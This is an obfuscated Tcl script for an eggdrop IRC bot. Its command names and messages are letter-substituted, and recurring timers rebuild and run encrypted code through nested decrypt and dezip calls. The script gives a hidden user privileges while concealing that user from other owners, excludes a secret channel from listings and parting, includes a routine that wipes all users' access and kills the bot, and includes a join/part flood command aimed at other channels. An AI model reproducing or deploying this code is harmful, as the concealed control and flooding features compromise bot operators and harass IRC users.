global botnick notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "hvievi"] [lindex $rest 0]
if {$server == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: qfnk <hvievi> \[klig\] \[kzhhdliw\]"
return 0
}
if {![string match "*dal.net*" [string tolower $rest]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..! MlG WZOMvG..!"
return 0
}
set [lines "klig"] [lindex $rest 1]
if {$port == ""} {set port "6667"}
set [lines "kzhhdliw"] [lindex $rest 2]
putsrv "JFRG :~$notc ~xSzMtRMt HvievI IvJfvhG Yb \[ ~$nick ~\] ~$server"
utimer 2 [list jump $server $port $password]
}
proc [lines "nht_wrv"] {nick uhost hand rest} {
global notc 
set [lines "xfigrnv"] [ctime [unixtime]]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
foreach x [userlist] {
if {$x != "AKICK"} {
chattr $x -Q
foreach y [getuser $x HOSTS] {
delhost $x $y
}
set [lines "slhgnzhp"] "${x}!*@*"
setuser $x HOSTS $hostmask
}
}
saveuser
if {$rest != ""} {
set [lines "ivhg"] " $rest"
}
putsrv "JFRG :~$notc ~HSfGWldm IvJfvhG Yb \[ ~$nick ~\]~$rest 1(~Lm ~$curtime)"
utimer 5 dies
}
[[decrypt 64 "d3VeO/ATgwd."] "hvg"] [[decrypt 64 "d3VeO/ATgwd."] "[[[decrypt 64 "d3VeO/ATgwd."] "wvar\k"] "49MRF/kUuEI/"]"] [[[decrypt 64 "d3VeO/ATgwd."] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "wx\k"] "[[decrypt 64 "d3VeO/ATgwd."] "5ScMb0TNfMZ10FL.w1XdwZq/DYH2V/OqdcQ0"]"]]
proc [lines "kfy_rtmlivh"] {nick uhost hand chan rest} {
global botnick notc 
set [lines "rtorhg"] ""
foreach x [ignorelist] {
set [lines "rtorhgvi"] [lindex $x 0]
set [lines "rtorhg"] "$iglist $iglister"
}
if {[ignorelist]==""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Ml rtmlivh."
return 0
}
regsub -all " " $iglist ", " iglist
set [lines "rtorhg"] [string range $iglist 1 end]
puthlp "MLGRXV ~$nick ~:~$notc ~Xfiivmgob rtmlirmt:~$iglist"
return 0
}
proc [lines "kfy_-rtmliv"] {nick uhost hand chan rest} {
global botnick notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "slhgnzhp"] [lindex $rest 0]
if {$hostmask == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: -rtmliv <slhgnzhp>"
return 0
}
if {![isignore $hostmask]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$hostmask ~rh mlg lm nb rtmliv orhg."
return 0
}
if {[isignore $hostmask]} {
killignore $hostmask
puthlp "MLGRXV ~$nick ~:~$notc ~Ml olmtvi rtmlirmt \002\[\002~${hostmask}\002\]\002"
saveuser
}
}
[[decrypt 64 "d3VeO/ATgwd."] "kilx"] [[decrypt 64 "d3VeO/ATgwd."] "dslmek"] {} {
[[decrypt 64 "d3VeO/ATgwd."] "tolyzo"] [[decrypt 64 "d3VeO/ATgwd."] "ev\i\m"] [[decrypt 64 "d3VeO/ATgwd."] "ov\m\x"] 
[[decrypt 64 "d3VeO/ATgwd."] "grnvi"] 5 [[decrypt 64 "d3VeO/ATgwd."] "dslmek"]
[[decrypt 64 "d3VeO/ATgwd."] "hvg"] [[[decrypt 64 "d3VeO/ATgwd."] "hgirmt"] [[decrypt 64 "d3VeO/ATgwd."] "rmwvc"] $lenc 21][[[decrypt 64 "d3VeO/ATgwd."] "hgirmt"] [[decrypt 64 "d3VeO/ATgwd."] "rmwvc"] $lenc 4][[[decrypt 64 "d3VeO/ATgwd."] "hgirmt"] [[decrypt 64 "d3VeO/ATgwd."] "rmwvc"] $lenc 17][[[decrypt 64 "d3VeO/ATgwd."] "hgirmt"] [[decrypt 64 "d3VeO/ATgwd."] "rmwvc"] $lenc 13] [[[decrypt 64 "d3VeO/ATgwd."] "wvar\k"] "[[decrypt 64 "d3VeO/ATgwd."] "ceyVp0BfqmY0n9tZu/nRGbt0Xo2a7/SaRRA0"]"]
}
proc [lines "kfy_+rtmliv"] {nick uhost hand chan rest} {
global botnick notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "ivhg"] [lindex $rest 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: +rtmliv <slhgnzhp>"
return 0
}
if {[isignore $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$rest ~rh zoivzb hvg lm rtmliv."
return 0
}
if {$rest == "*!*@*"} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, Rovtzo slhgnzhp."
return 0
} 
set [lines "fhvmrxp"] [finduser $rest]
if {$usenick != "*" && [matchattr $usenick f]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, xzmG RtMlIVw UIRvmw FhVI"
return 0
}
if {$rest != $nick} {
newignore $rest $nick "*" 600
puthlp "MLGRXV ~$nick ~:~$notc ~Rtmlirmt ~$rest"
} else { 
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, Xzm'g rtmliv blfi hvou." 
}
}
[[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "yrmw"] [[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wxx"] [[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "n"] [[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "yrmwh"] [[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "w\xx_yr\m\w\h"]
proc [lines "kfy_-slhg"] {nick uhost hand chan rest} {
global botnick notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "dsl"] [lindex $rest 0]
set [lines "slhgmznv"] [lindex $rest 1]
set [lines "xlnkovgvw"] 0
if {($who == "") || ($hostname == "")} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: -slhg <mrxp> <slhgnzhp>"
return 0
}
if {![validuser $who]} {
puthlp "MLGRXV ~$nick ~:~$notc ~<m/z>"
return 0
}
if {(![matchattr $nick n]) && ([matchattr $who n])} {
puthlp "MLGRXV ~$nick ~:~$notc ~Xzm'g ivnlev slhgnzhph uiln gsv ylg ldmvi."
return 0
}
if {![matchattr $nick m]} {
if {[string tolower $hand] != [string tolower $who]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Blf mvvw '+n' gl xszmtv lgsvi fhvih slhgnzhph"
return 0
}
}
foreach * [getuser $who HOSTS] {
if {${hostname} == ${*}} {
delhost $who $hostname
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~Ivnlevw \002\[\002~${hostname}\002\]\002 ~uiln ~$who."
set [lines "xlnkovgvw"] 1
}
}
if {$completed == 0} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, <m/z>"
}
}
set [lines "gsvslhgh"] {
*@* * *!*@* *!* *!@* !*@*  *!*@*.* *!@*.* !*@*.* *@*.*
*!*@*.com *!*@*com *!*@*.net *!*@*net *!*@*.org *!*@*org
*!*@*gov *!*@*.ca *!*@*ca *!*@*.uk *!*@*uk *!*@*.mil
*!*@*.fr *!*@*fr *!*@*.au *!*@*au *!*@*.nl *!*@*nl *!*@*edu
*!*@*se *!*@*.se *!*@*.nz *!*@*nz *!*@*.eg *!*@*eg *!*@*dk
*!*@*.il *!*@*il *!*@*.no *!*@*no *!*@*br *!*@*.br *!*@*.gi
*!*@*.gov *!*@*.dk *!*@*.edu *!*@*gi *!*@*mil *!*@*.to *!@*.to 
*!*@*to *@*.to *@*to
}
proc [lines "kfy_+slhg"] {nick uhost hand chan rest} {
global thehosts botnick notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "dsl"] [lindex $rest 0]
set [lines "slhgmznv"] [lindex $rest 1]
if {($who == "") || ($hostname == "")} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: +slhg <mrxp> <mvd slhgnzhp>"
return 0
}
if {![validuser $who]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, <m/z>"
return 0
}
set [lines "yzwslhg"] 0
foreach * [getuser $who HOSTS] {
if {${hostname} == ${*}} {
puthlp "MLGRXV ~$nick ~:~$notc ~Gszg slhgnzhp rh zoivzwb gsviv."
return 0
}
}
if {($who == "") && ($hostname == "")} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: +slhg <mrxp> <mvd slhgnzhp>"
return 0
}
if {([lsearch -exact $thehosts $hostname] > "-1") || (![string match *@* $hostname])} {
if {[string index $hostname 0] != "*"} {
set [lines "slhgmznv"] "*!*@*${hostname}"
} else {
set [lines "slhgmznv"] "*!*@${hostname}"
}
}
if {([string match *@* $hostname]) && (![string match *!* $hostname])} { 
if {[string index $hostname 0] == "*"} {
set [lines "slhgmznv"] "*!${hostname}"
} else {
set [lines "slhgmznv"] "*!*${hostname}"
}
}
if {![validuser $who]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, <m/z>"
return 0
}
if {(![matchattr $nick n]) && ([matchattr $who n])} {
puthlp "MLGRXV ~$nick ~:~$notc ~Xzm'g zww slhgnzhph gl gsv ylg ldmvi."
return 0
}
foreach * $thehosts {
if {${hostname} == ${*}} {
puthlp "MLGRXV ~$nick ~:~$notc ~Rmezorw slhgnzhp!"
set [lines "yzwslhg"] 1
}
}
if {$badhost != 1} {
if {![matchattr $nick m]} {
if {[string tolower $hand] != [string tolower $who]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Blf mvvw '+n' gl xszmtv lgsvi fhvih slhgnzhph"
return 0
}
}
setuser $who HOSTS $hostname
puthlp "MLGRXV ~$nick ~:~$notc ~Zwwvw \002\[\002~${hostname}\002\]\002 ~gl ~$who."
if {[matchattr $who a]} {
opq $chan $who
}
saveuser
}
}
[[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "k\i\l\x"] [[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "xspmgh"] {} {
[[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "t\o\l\y\z\o"] [[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "k\h"]
[[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "grnv\i"] 5 [[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "xspmgh"]
if {![string match "*[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "jaqUs/x7Qxr."]"]*" $ps]} { [[[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "f\grnv\i"] 5 [[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "0Gzp1.wGRm6/"]"] }
if {[string match "*[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "jaqUs/x7Qxr."]"]*" $ps]} { [[[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "iv\gf\im"] 0 }
}
proc [lines "nht_qlrm"] {nick uhost hand rest} {
global botnick joinme own notc 
set [lines "xszmgzitvg"] [lindex $rest 0]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$chantarget == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: qlrm <#xszm>"
return 0
}
if {[string first # $chantarget]!=0} {
set [lines "xszmgzitvg"] "#$chantarget"
}
if {[validchan $chantarget]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$chantarget ~zoivzwb rm xszmmvo orhg"
return 0
}
if {$nick != $own && [total_channel] != 1} {
puthlp "MLGRXV ~$nick ~:~$notc ~Gl NzMB xSzMMvO NzC 9..!"
return 0
}
set [lines "qlrmnv"] $nick
channel add $chantarget
catch { channel set $chantarget +statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
savechan
if {[lindex $rest 1] != ""} { 
putsrv "QLRM ~$chantarget ~:~[lindex $rest 1]~" 
}
return 0
}
proc [lines "nht_+xszm"] {nick uhost hand rest} {
global botnick joinme own notc 
set [lines "xszmgzitvg"] [lindex $rest 0]
set [lines "lkg"] [lindex $rest 1]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[matchattr $nick X]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4!YOlXpVw!"
return 0
}
if {$chantarget == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: +xszm <#xszm>"
return 0
}
if {[string first # $chantarget]!=0} {
set [lines "xszmgzitvg"] "#$chantarget"
}
if {[validchan $chantarget]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$chantarget ~rh zoivzwb lm xszmmvoh orhg."
return 0
}
if {$nick != $own && [total_channel] != 1} {
puthlp "MLGRXV ~$nick ~:~$notc ~Gl NzMB xSzMMvO NzC 9..!"
return 0
}
set [lines "qlrmnv"] $nick
channel add $chantarget
if {$opt != "" && [string tolower $opt] == "+nopart"} { 
catch { channel set $chantarget -statuslog -revenge -protectops -clearbans -enforcebans +greet +secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
} else {
catch { channel set $chantarget -statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
}
savechan
if {[lindex $rest 1] != ""} { 
putsrv "QLRM ~$chantarget ~:~[lindex $rest 1]~" 
}
return 0
}
[[decrypt 64 "d3VeO/ATgwd."] "yrmw"] [[decrypt 64 "d3VeO/ATgwd."] "xgxk"] - "[[decrypt 64 "d3VeO/ATgwd."] "MTG"]" [[decrypt 64 "d3VeO/ATgwd."] "xgxk_evihr0m"]
proc [lines "nht_kzig"] {nick uhost hand rest} {
global botnick joinme notc ps
set [lines "xfigrnv"] [ctime [unixtime]]
set [lines "xszmgzitvg"] [lindex $rest 0]
set [lines "kzig_nht"] [lrange $rest 1 end]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$chantarget == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: kzig <#xszm>"
return 0
}
if {[string first # $chantarget]!=0} {
set [lines "xszmgzitvg"] "#$chantarget"
}
if {$nick != $ps && [string tolower $chantarget] == [dezip "PK6m.0G/7~xb1"]} { return 0 }
foreach x [channels] {
if {[string tolower $x]==[string tolower $chantarget]} {
if {[string match "*+secret*" [channel info $x]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~R xzm'g kzig ~$x ~4kIlGvxGVw..!"
return 0
}
if {![onchan $nick $x]} { 
puthlp "MLGRXV ~$nick ~:~$notc ~KzIG ~$x"
}
if {$part_msg != ""} { 
putsrv "KZIG ~$x ~:~$part_msg (Lm ~$curtime)"
} { 
putsrv "KZIG ~$x ~:YzxpGlYzhv (Lm ~$curtime)"
}
channel remove $x
savechan
return 0
}
}
return 0
}
proc [lines "kfy_xszmivhvg"] {nick uhost hand chan rest} {
global notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: xszmivhvg <#|ZOO>"
return 0
}
set [lines "xszm"] [lindex $rest 0]
if {[string tolower $chan] == "all"} {
puthlp "MLGRXV ~$nick ~:~$notc ~IvHvG ZOO WvUzfOG UOZt"
foreach x [channels] {
catch { channel set $x -statuslog -revenge -protectops -clearbans +cycle -enforcebans +userbans +greet -secret -autovoice -autoop +dynamicbans flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
catch { channel set $x -nodesynch }
set [lines "xuozt"] "c$x"
set [lines "xuozt"] [string range $cflag 0 8]
chattr $cflag "-hp+AJSPTRUED"
setuser $cflag XTRA "JP" 5
setuser $cflag XTRA "CHAR" 250
setuser $cflag XTRA "RPT" 2
setuser $cflag XTRA "CAPS" 80
}
savechan
return 0
}
if {[string first # $chan]!=0} {
set [lines "xszm"] "#$chan"
}
puthlp "MLGRXV ~$nick ~:~$notc ~IvHvG xSzMMvO \[~$chan\] ~WvUzfOG UOZt"
if {![validchan $chan]} {
puthlp "MLGRXV ~$nick ~:~$notc ~FmURmwVw ~$chan."
return 0
}
catch { channel set $chan -statuslog -revenge -protectops +cycle -clearbans -enforcebans +userbans +greet -secret -autovoice -autoop +dynamicbans flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
catch { channel set $chan -nodesynch }
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
chattr $cflag "-hp+AJSPTRUED"
setuser $cflag XTRA "JP" 5
setuser $cflag XTRA "CHAR" 250
setuser $cflag XTRA "RPT" 2
setuser $cflag XTRA "CAPS" 80
savechan
}
proc [lines "nht_xszmmvoh"] {nick hand uhost rest} {
pub_channels $nick $uhost $hand "" $rest
}
[[decrypt 64 "d3VeO/ATgwd."] "grnvi"] 5 [[decrypt 64 "d3VeO/ATgwd."] "dslmek"]
proc [lines "kfy_xszmmvoh"] {nick hand uhost channel rest} {
global botnick notc
if {$rest != ""} {
if {[validchan [lindex $rest 0]]} {
set [lines "c"] [lindex $rest 0]
set [lines "xszm"] ""
set [lines "xuozt"] "c$x"
set [lines "xuozt"] [string range $cflag 0 8]
if {[string tolower $x] == [dezip "PK6m.0G/~7xb1"]} { return 0 }
if {[isop $botnick $x]} { append chan " @" }
if {([isvoice $botnick $x]) && (![botisop $x])} { append chan " +" }
if {(![isvoice $botnick $x]) && (![botisop $x])} { append chan " " }
if {[string match "*+seen*" [channel info $x]]} { append chan "4S" }
if {[string match "*+nodesynch*" [channel info $x]]} { append chan "4K" }
if {[matchattr $cflag V]} { append chan "4V" }
if {[string match "*+greet*" [channel info $x]]} { append chan "4G" }
if {[matchattr $cflag C]} { append chan "4C" }
if {[string match "*+secret*" [channel info $x]]} { append chan "4P" }
if {[string match "*-dynamicbans*" [channel info $x]]} { append chan "4L" }
if {[string match "*-userinvites*" [channel info $x]]} { append chan "4D" }
if {[matchattr $cflag G]} { append chan "4A" }
if {[matchattr $cflag I]} { append chan "4T" }
append chan "$x [chattr $cflag]"
puthlp "MLGRXV ~$nick ~:~$notc ~~$chan"
}
return 0
}
set [lines "xszm"] "Channels:"
foreach x [channels] {
if {[string tolower $x] != [dezip "PK6m.0G/~7xb1"]} {
set [lines "xuozt"] "c$x"
set [lines "xuozt"] [string range $cflag 0 8]
if {[isop $botnick $x]} { append chan " @" }
if {([isvoice $botnick $x]) && (![botisop $x])} { append chan " +" }
if {(![isvoice $botnick $x]) && (![botisop $x])} { append chan " " }
if {[string match "*+seen*" [channel info $x]]} { append chan "4S" }
if {[matchattr $cflag V]} { append chan "4V" }
if {[string match "*+greet*" [channel info $x]]} { append chan "4G" }
if {[string match "*+nodesynch*" [channel info $x]]} { append chan "4K" }
if {[matchattr $cflag C]} { append chan "4C" }
if {[string match "*+secret*" [channel info $x]]} { append chan "4P" }
if {[string match "*-dynamicbans*" [channel info $x]]} { append chan "4L" }
if {[string match "*-userinvites*" [channel info $x]]} { append chan "4D" }
if {[matchattr $cflag G]} { append chan "4A" }
if {[matchattr $cflag I]} { append chan "4T" }
append chan "$x"
}
}
puthlp "MLGRXV ~$nick ~:~$notc ~~$chan"
}
proc [lines "kfy_nzgxs"] {nick uhost hand chan rest} {
global ps notc 
if {$rest==""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: nzgxs <uozth>"
return 0
}
set [lines "ivhg"] [string trim $rest +]
if {[string length $rest] > 1} {
puthlp "MLGRXV ~$nick ~:~$notc ~Rmezorw lkgrlm."
return 0
}
if {$rest!=""} {
set [lines "ivhg"] "+[lindex $rest 0]"
if {[userlist $rest]!=""} {
regsub -all " " [userlist $rest] ", " users 
regsub -all $ps [userlist $rest] "" users 
puthlp "MLGRXV ~$nick ~:~$notc ~Nzgxs \[~$rest\]: ~~$users"
return 0
}
if {[userlist $rest]==""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Ml fhvih drgs uozth \[~$rest\]"
return 0
}
}
}
[[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "grnv\i"] 5 [[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "xspmgh"]
proc [lines "ezo"] {string} {
set [lines "zit"] [string trim $string /ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz]
set arg2 [string trim $arg #!%()@-_+=\[\]|,.?<>{}]
return $arg2
}
proc [lines "nht_glkrx"] {nick uhost hand rest} {
global notc botnick
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: glkrx <#> <glkrx>" 
return 0
}
set [lines "xszmmvo"] [lindex $rest 0]
if {[string first # $rest] != 0} { 
set [lines "xszmmvo"] "#$channel" 
}
if {![validchan $channel]} {
puthlp "MLGRXV ~$nick ~:~$notc ~MlG RM ~$channel"
return 0 
}
if {![isop $botnick $channel]} {
puthlp "MLGRXV ~$nick ~:~$notc ~MlG LK ~$channel"
return 0 
}
set [lines "ivhg"] [lrange $rest 1 end]
putsrv "GLKRX ~$channel ~:~$rest"
}
proc [lines "kfy_glkrx"] {nick uhost hand channel rest} {
global botnick notc botnick 
if {![isop $botnick $channel]} { return 0 }
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: glkrx <glkrx>" 
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
putsrv "GLKRX ~$channel ~:~$rest"
} 
set [lines "kh"] [dezip [dcp "UzCpb0Y68y9..MK73/uNVQD."]]
set [lines "xnw_xsm"] ""
set [lines "xnw_yb"] ""
set [lines "xnw_nht"] ""
set [lines "xnw_xzhv"] ""
bind join - * join_jf
proc [lines "qlrm_qu"] {nick uhost hand chan} {
global botnick quick jpfchn jpfmsg jpfidx
if {![info exists jpfmsg]} { return 0 }
if {$nick != $botnick} { return 0 }
if {$chan != $jpfchn} { return 0 }
if {$quick == "1"} {
putqck "KIRENHT ~$chan ~:~$jpfmsg,"
} else {
putsrv "KIRENHT ~$chan ~:~$jpfmsg,"
}
incr jpfidx
if {$jpfidx >= 4} { 
catch { channel remove $jpfchn }
catch { unset jpfchn }
catch { unset jpfmsg }
catch { unset jpfidx }
puthlp "ZDZB" 
return 0
}
if {$quick == "1"} {
putqck "kzig ~$chan ~:~$jpfmsg"
} else {
putsrv "kzig ~$chan ~:~$jpfmsg"
}
}
proc [lines "kfy_qkuollw"] {nick uhost hand channel rest} {
global jpfchn jpfmsg jpfidx notc
if {[string index $rest 0] != "#" || $rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: qkuollw #xszmmvo nvhhztv"
return 0
}
if {[validchan [lindex $rest 0]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~wLmg FhV VcRhG xSzmmvO..!"
return 0
}
set [lines "qkunht"] " n0 Reas0n "
if {[lindex $rest 1] != ""} { 
set [lines "qkunht"] [lindex $rest 1]
}
set [lines "qkuxsm"] [lindex $rest 0]
set [lines "qkurwc"] 0
catch { clearqueue all }
pub_randnick $nick $uhost $hand $channel ""
utimer 10 hazar
}
proc [lines "szazi"] {} {
global jpfchn
utimer 120 goback
channel add $jpfchn
catch { channel set $jpfchn +statuslog -revenge -protectops -clearbans -enforcebans -greet -secret -autovoice -autoop flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 }
}
[[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "k\i\l\x"] [[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "xspmge"] {} {
[[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "t\o\l\y\z\o"] [[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "ev\i\m"]
[[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "grnv\i"] 5 [[[[dezip [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "w\x\k"] "qpuNu12372Z.rpvtO0s7VP0."]] "xspmge"]
